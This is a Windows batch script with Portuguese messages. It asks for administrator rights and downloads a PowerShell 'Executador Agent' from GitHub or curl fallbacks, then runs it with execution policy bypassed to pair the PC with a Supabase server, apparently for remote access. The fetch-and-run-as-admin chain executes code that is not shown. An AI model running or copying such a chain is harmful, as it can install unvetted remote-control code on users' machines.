@echo off
setlocal EnableExtensions
title Executador - Conectar PC

if /I "%~1"=="ELEVATED" goto :elevated

echo.
echo ==============================================
echo             EXECUTADOR
echo ==============================================
echo.
echo Solicitando permissao de Administrador...
echo.

set "EXECUTADOR_SELF=%~f0"
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "$q=[char]34; $p=$env:EXECUTADOR_SELF; try { Start-Process -FilePath 'cmd.exe' -Verb RunAs -ArgumentList ('/k ' + $q + $p + $q + ' ELEVATED'); exit 0 } catch { Write-Host $_.Exception.Message -ForegroundColor Red; exit 1 }"

if errorlevel 1 (
  echo.
  echo [ERRO] Nao foi possivel solicitar permissao de Administrador.
  echo Clique com o botao direito neste arquivo e escolha Executar como administrador.
  echo.
  pause
)
exit /b

:elevated
fltmc >nul 2>&1
if errorlevel 1 (
  echo.
  echo [ERRO] Esta janela ainda nao esta como Administrador.
  echo Execute manualmente como Administrador.
  echo.
  pause
  exit /b 1
)

set "ROOT=%ProgramData%\Executador"
set "AGENT=%ROOT%\ExecutadorAgent.ps1"
set "TMPAGENT=%ROOT%\ExecutadorAgent.new.ps1"

if not exist "%ROOT%" mkdir "%ROOT%"
if errorlevel 1 (
  echo.
  echo [ERRO] Nao foi possivel criar %ROOT%.
  pause
  exit /b 1
)

del /q "%TMPAGENT%" >nul 2>&1

echo.
echo [1/3] Testando o servidor do Executador...
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; $r=Invoke-WebRequest 'https://skzyxapvleyktmgshvfp.supabase.co/functions/v1/agent-api/public/health' -UseBasicParsing -TimeoutSec 20; if($r.StatusCode -ne 200){exit 1} } catch { Write-Host ('Aviso: '+$_.Exception.Message) -ForegroundColor Yellow; exit 1 }"
if errorlevel 1 (
  echo [AVISO] O teste direto falhou. Vou tentar o download mesmo assim.
)

echo.
echo [2/3] Atualizando o Executador Agent...
echo Tentativa 1: GitHub Pages
powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest 'https://conexaostreet.github.io/conexao-street1teste/agent/ExecutadorAgent.ps1?v=0310' -OutFile '%TMPAGENT%' -UseBasicParsing -TimeoutSec 45; if((Get-Item '%TMPAGENT%').Length -lt 1000){exit 1} } catch { Write-Host ('Falha Pages: '+$_.Exception.Message) -ForegroundColor Yellow; exit 1 }"

if errorlevel 1 (
  del /q "%TMPAGENT%" >nul 2>&1
  echo Tentativa 2: GitHub Raw
  powershell.exe -NoProfile -ExecutionPolicy Bypass -Command "try { [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; Invoke-WebRequest 'https://raw.githubusercontent.com/ConexaoStreet/conexao-street1teste/main/agent/ExecutadorAgent.ps1' -OutFile '%TMPAGENT%' -UseBasicParsing -TimeoutSec 45; if((Get-Item '%TMPAGENT%').Length -lt 1000){exit 1} } catch { Write-Host ('Falha Raw: '+$_.Exception.Message) -ForegroundColor Yellow; exit 1 }"
)

if errorlevel 1 (
  del /q "%TMPAGENT%" >nul 2>&1
  where curl.exe >nul 2>&1
  if not errorlevel 1 (
    echo Tentativa 3: curl.exe
    curl.exe -fL --connect-timeout 15 --max-time 60 --retry 2 --retry-delay 2 "https://raw.githubusercontent.com/ConexaoStreet/conexao-street1teste/main/agent/ExecutadorAgent.ps1" -o "%TMPAGENT%"
  )
)

if exist "%TMPAGENT%" (
  for %%A in ("%TMPAGENT%") do if %%~zA GEQ 1000 (
    move /y "%TMPAGENT%" "%AGENT%" >nul
  )
)

if not exist "%AGENT%" (
  echo.
  echo ============================================================
  echo [ERRO] Nao foi possivel baixar o Executador Agent.
  echo.
  echo Seu Windows esta fechando a conexao HTTPS durante o download.
  echo Testamos GitHub Pages, GitHub Raw e curl.exe.
  echo ============================================================
  echo.
  pause
  exit /b 1
)

if exist "%TMPAGENT%" del /q "%TMPAGENT%" >nul 2>&1

echo Agent disponivel em:
echo %AGENT%
echo.
echo [3/3] Gerando codigo de conexao...
echo.
powershell.exe -NoProfile -ExecutionPolicy Bypass -File "%AGENT%" -PairFromPc
set "AGENT_EXIT=%ERRORLEVEL%"

if not "%AGENT_EXIT%"=="0" (
  echo.
  echo ============================================================
  echo [ERRO] O Agent terminou com codigo %AGENT_EXIT%.
  echo Log: %ProgramData%\Executador\logs\agent.log
  echo ============================================================
  echo.
  pause
  exit /b %AGENT_EXIT%
)

echo.
echo Sessao do Executador encerrada.
echo.
pause
endlocal
